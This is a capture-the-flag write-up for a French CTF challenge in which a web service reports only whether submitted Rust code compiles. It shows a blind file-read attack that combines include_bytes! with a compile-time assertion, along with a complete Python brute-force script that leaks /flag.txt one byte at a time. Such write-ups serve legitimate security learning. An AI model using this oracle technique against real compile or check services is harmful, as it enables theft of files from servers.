# Le Rustique

> On vous demande d'auditer cette solution de vérification syntaxique en Rust.
> 
> Lien : http://challenges2.france-cybersecurity-challenge.fr:6005/

Well ... if we can compile Rust, we'll first try to include some file at compile-time with the [`include_bytes!()` macro](https://doc.rust-lang.org/core/macro.include_bytes.html)

![First glance][first_glance.png "At first glance, we can compile anything."]

```
$ curl 'http://challenges2.france-cybersecurity-challenge.fr:6005/check' -H 'Content-Type: application/json' --data '{"content":"include_bytes!(\"/flag.txt\");"}' 
{"result":0}
curl 'http://challenges2.france-cybersecurity-challenge.fr:6005/check' -H 'Content-Type: application/json' --data '{"content":"ERROR"}' 
{"result":1}
```

This is a webapp that compiles Rust code and returns a boolean to indicate if compilation was successful or not.

We know `access to sensitive data + boolean output = blind retrieval` so we think about how to setup a blind attack so we can read the content of `flag.txt`. For this we need:

- read data (`include_bytes!` is fine)
- select one byte of data and compare it to a byte we control
- fail the compilation when the two bytes are not equal

As `include_bytes!()` macro does not return any compilation error, we know we can load some bytes from `/flag.txt`. Now, we have to find a way to make the compilation fail whenever we want, and only if two bytes aren't equal.

There's an `assert!()` macro which does exactly what we want **but** this is executed at run-time, it's of no use for us now. After a bit of research I came across a crate called `static_assertions` which ships with a `static_assert!()` macro, which is static, so it's executed at compile-time ! Problem : the crate is not loaded and we can't load-it with `extern crate`, it's probably not an installed crate.

Hopefully, the author of `static_assertions` crate wrote [a post](https://nikolaivazquez.com/posts/programming/rust-static-assertions/) that explains everything it does, with code examples.

One of those examples is:

```rust
macro_rules! const_assert {
    ($condition:expr) => {
        #[deny(const_err)]
        #[allow(dead_code)]
        const ASSERT: usize = 0 - !$condition as usize;
    }
}
```

This macro enables us to write:

```rust
const_assert!(b'a' == b'a');
const_assert!(b'a' == b'b'); # Compilation error
```

Now we only have to select a character of `/flag.txt` data and compare it to our charset (`FCSC{[0-9a-z]+}`). I wrote a Python script to do just that automatically.

```python
#!/usr/bin/env python3
import string
import requests

PAYLOAD = """
macro_rules! const_assert {
    ($condition:expr) => {
        #[deny(const_err)]
        #[allow(dead_code)]
        const ASSERT: usize = 0 - !$condition as usize;
    }
}

// Load flag bytes from /flag.txt
const KEY: &'static [u8] = include_bytes!("/flag.txt");

// Assert one byte equals one other byte we control
const_assert!(KEY[XXX] == b'YYY');
"""
CHARSET = string.digits + string.ascii_lowercase + "}"
PLAIN = "FCSC{"

url = 'http://challenges2.france-cybersecurity-challenge.fr:6005/check'
ua = requests.Session()

i = len(PLAIN)

while True:
    for c in CHARSET:
        r = ua.post(url, json={
            # XXX > index of the target char
            # YYY > character to compare the target char to
            "content": PAYLOAD.replace('XXX', str(i)).replace('YYY', c)
        })
        print("{}{}".format(PLAIN, c), end="\r")

        # If no compilation error
        if '0' in r.text:
            # we found a char
            PLAIN = PLAIN + c
            break
    
    if PLAIN[-1] == '}':
        print('\n[!] FINISHED.')
        break

    i = i + 1
```